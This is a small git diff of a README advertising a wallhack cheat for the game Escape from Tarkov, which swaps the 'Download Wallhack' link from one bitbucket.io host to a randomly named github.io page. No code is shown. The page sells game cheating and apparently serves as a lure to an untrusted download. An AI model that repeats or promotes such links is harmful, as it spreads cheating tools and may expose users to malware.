@@ -2,7 +2,7 @@
 
 **Tired of getting ambushed? Hate peeking corners blind? A Tarkov wallhack gives you full vision of PMCs, loot, AI, and traps before you even hear a footstep. No more guesswork — just tactical dominance.**
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload18.bitbucket.io)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://Tarkov-Wallhack-ta6.github.io/.github)
 ---
 
 ## 👁️ What is a Wallhack in Escape from Tarkov?
